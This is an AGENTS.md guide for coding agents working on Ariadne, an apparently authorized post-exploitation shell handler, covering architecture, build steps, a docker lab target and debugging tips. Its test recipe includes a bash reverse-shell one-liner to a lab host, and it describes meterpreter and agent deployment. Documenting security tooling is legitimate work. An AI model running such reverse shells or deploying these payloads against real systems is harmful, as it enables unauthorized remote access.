# AGENTS.md — for AI agents working on ariadne

Instructions for coding agents (human or AI) touching this repo. Read this
before your first edit. ISSUES.md holds the current bug/fix state — update it
when you close or open work.

## What this is

Ariadne (`ariadne-shell-handler`, fork of Penelope by brightio) is a
post-exploitation shell handler: it catches reverse shells, upgrades them to
PTY/agent sessions, and runs exploit/enumeration modules against targets.
Pure-stdlib Python (no dependencies), runs on CPython ≥3.7, developed on 3.14.
**Authorized security testing only** — the lab environment referenced below
belongs to the operator; never touch machines outside the stated task.

## Hard rules learned the hard way (2026-10-05 session)

1. **The installed tool is not the source until proven otherwise.** Behavior
   changes only take effect after `uv tool install --reinstall .`, and you
   must diff installed vs source before drawing any conclusion from a live
   run (the diff command is in ISSUES.md). A stale install once burned an
   entire debugging day.
2. **Reproduce in the real path first.** Do NOT build synthetic test
   scaffolds around a symptom before running the actual user flow in the
   actual environment. Instance-state bugs will not reproduce headless; if
   controlled repros keep "surviving", that is a finding, not bad luck.
3. **The operator's symptom description is ground truth.** "The session
   dies" vs "it gets stuck" are different bugs; a one-sentence correction
   from the operator can invalidate hours of analysis. Re-confirm the
   symptom before root-causing.
4. **Verify platform facts, don't assume.** Use web search for documented
   behavior (bash semantics, msf payload sizes) and live probes on the
   target for environment facts (mount flags, file sizes). Example: a
   250-byte msfvenom ELF is the correct *stager* size for
   `linux/x64/meterpreter/reverse_tcp` — the ~3 MB *stage* is delivered by
   the handler over the socket. Do not misdiagnose small binaries as
   truncation.

## Architecture map

| File | Role |
|---|---|
| `ariadne/engine.py` (~4.4k lines, the monolith) | `Session` (shell + agent modes), `exec()` with two transports — binary Messenger protocol for agents vs printf-marker typing for raw shells, upload/download (tar/base64 fallbacks), PTY upgrade, agent deploy (`upgrade()`, `can_deploy_agent`, `exec_tmp`, `need_binary`) |
| `ariadne/core.py` | `Core.loop` — the select() event loop; kills sessions on socket EOF/error. Bracketed-paste stripping for Raw sessions |
| `ariadne/messenger.py` | Binary framing protocol used between handler and deployed agent (EXEC, SHELL, stream ids) |
| `ariadne/modules.py` | `Module` subclasses (`meterpreter`, `traitor`, `ligolo`, …); modules call `session.exec/upload` and get the agent auto-deployed for them |
| `ariadne/menu`/`cli_input.py` | Interactive menu, session attach (menu key), prompt rendering |
| `ariadne/options.py` | CLI flags; `_cleanup_ephemeral` wipes target-side caches on clean exit |
| `ariadne/payload_data.py` | URL table (`URLS`) + standalone-python matrix (`PYTHON_STANDALONE_BINARIES` keyed by `(system, arch, libc)`) |
| `ariadne/display.py` | PBar, `Open(item, terminal=True)` (spawns Ghostty windows on this workstation — the operator can see them) |
| `ariadne/mcp_server.py` | MCP tool interface; `utils.py`, `log.py`, `network.py` (listeners), `fileserver.py` (HTTP), `compat.py` |

Session flow: listener accepts → `Session` (raw shell) → probes (OS/arch/bins)
→ on demand `upgrade()` → agent deploy (standalone python if the system python
is crippled) → agent session (PTY, Messenger protocol). Modules transparently
trigger upgrade via `agent_only`-wrapped session ops.

## Build / run / test

```bash
# install the fixed code (REQUIRED after any source edit):
uv tool install --reinstall .
# verify installed == source (ISSUES.md has the exact diff line):
diff -rq --exclude=__pycache__ \
  ~/.local/share/uv/tools/ariadne-shell-handler/lib/python3.14/site-packages/ariadne \
  ~/Tools/ariadne/ariadne && echo OK

# tests (must be green before you commit):
python3 -m unittest discover -s tests   # 62 tests, ~1s

# run interactively (dev mode adds instrumentation):
ariadne -dd -p 1345
```

`tests/test_agent_deploy.py` compiles the real deploy pipeline (agent source
format, payload compile, dev-mode bootstrap, instrumentation markers). If you
touch agent source, `upgrade()`, or the `exec()` marker build — run it.

## The lab (do not break it)

- `deb13` docker container (debian:13, 172.17.0.x) is the live test target.
  Host connects to it via reverse shells to `172.17.0.1:<port>`.
- deb13's **system python is crippled** → agent deploys standalone python
  (33 MB download+upload, ~2 min). The target-side cache dir is wiped by
  `_cleanup_ephemeral` on clean ariadne exit — re-deploying is normal.
- **`/dev/shm` is noexec on deb13; `/tmp` is exec-ok.** `exec_tmp` probes
  executability and must keep doing so.
- Zen-kernel hardening: root on deb13 cannot overwrite files owned by foreign
  uids (tar uploads carry uid/gid 0 for this reason).
- The container dies with SIGHUP when its main bash terminal goes away;
  `docker start -ai deb13` restores it. Other running containers (goad-*, 
  kali-lab) are a separate lab — do not touch without being asked.

## Landmines (all of these have caused real bugs)

- **Interactive bash history expansion.** Commands typed into PTY shells get
  `!`-expansion: `echo "#!/bin/sh"` breaks (`event not found`). Single-quote
  anything with `!` in probes/one-liners sent to interactive shells.
- **`exec()` marker build.** For non-raw Unix exec, the completion marker is
  appended to the command. Commands ending in `&`, `|`, `;` must be followed
  by a space, not `;` (`nohup x &;printf` is a bash syntax error that rejects
  the whole line). See the `sep` logic in `engine.py exec()`.
- **Agent chunk commands end with `\n:`** (heredoc terminator guard). Do not
  remove it.
- **PTY echo interleaving** can garble setup-time probes (`session.arch` can
  be wrong on agent sessions). Anything choosing binaries by arch should
  re-probe fresh (`uname -m`) like the meterpreter module does.
- **Handler port guard.** `meterpreter` probes the handler port and only
  spawns msfconsole when free. Each spawn opens a visible Ghostty window;
  leftover stuck windows from failed runs race on the port — kill them
  (`pkill -f msfconsole`) before clean repros.
- **`Session.kill()` is routed through `core.control`** when called from
  non-Core threads. Socket teardown happens in the Core thread only; grep
  kill paths before assuming "something closed the socket".

## Debugging recipes

- **Agent death forensics (dev mode only, `-dd`):** target writes
  `/tmp/agent_exit.txt` (socket EOF `data=b''` = FIN from ariadne; `None` =
  RST), `/tmp/agent_crash.txt` (bootstrap traceback), `/tmp/agent_sig.txt`
  (trapped signals). Read with `docker exec deb13 cat ...`. Ariadne-side,
  `-dd` logs `Thread <name> wants to kill session <id>` from `Session.kill()`.
- **Driving interactive ariadne from a script:** use tmux
  (`tmux new-session -d -s name 'ariadne -dd -p 1345'` + `send-keys` /
  `capture-pane`). A bare pty job fails at `tty.setraw` (no termios).
- **Target-side ground truth:** `docker exec deb13` for file/process checks;
  `ss -tnp` on the host for live connections.
- One reverse shell for tests: `docker exec -d deb13 bash -c 'bash -i >&
  /dev/tcp/172.17.0.1/1345 0>&1'`.

## Conventions

- Tabs for indentation (match the existing code exactly).
- Stdlib only — do not add dependencies.
- Python 3.14 quirks matter here (see ISSUES.md exit-hang history).
- Keep ISSUES.md current: move resolved items to FIXED with root cause and
  verification, keep env quirks and commands accurate. New session, new
  date header.
- Tests must be deterministic and isolated; no new tests for wiring-only
  changes — prove behavior with a live run instead.
